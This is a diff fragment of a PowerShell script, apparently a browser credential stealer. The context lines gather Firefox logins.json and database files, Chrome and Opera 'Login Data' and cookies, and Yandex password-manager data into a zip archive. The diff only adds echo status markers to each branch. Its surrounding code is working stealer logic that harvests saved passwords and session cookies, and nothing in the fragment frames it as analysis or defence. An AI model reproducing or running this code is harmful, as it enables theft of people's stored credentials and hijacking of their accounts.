@@ -13,6 +13,7 @@ if(Test-Path -Path $f)
     {Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
   elseif("7-Zip" -in $arh)
     {.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}
+  echo "Mqwe"
 }
 else{echo "Masd"}
 
@@ -23,6 +24,7 @@ if(Test-Path -Path $g){
     {Get-ChildItem -Path $g -Include "Login Data", "Cookies" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
   elseif("7-Zip" -in $arh)
     {.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}
+  echo "Gqwe"
 }
 else{echo "Gasd"}
 
@@ -33,6 +35,7 @@ if(Test-Path -Path $y){
     {Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
   elseif("7-Zip"-in $arh)
     {.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}
+  echo "Yqwe"
 }
 else{echo "Yasd"}
 
@@ -43,6 +46,7 @@ if(Test-Path -Path $o){
     {Get-ChildItem -Path $o -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -CompressionLevel Fastest -DestinationPath $p}
   elseif("7-Zip"-in $arh)
     {.\7z.exe a $p ($o+"Login Data"),($o+"Cookies") -spf -tzip}
+  echo "Oqwe"
 }
 else{echo "Oasd"}
 
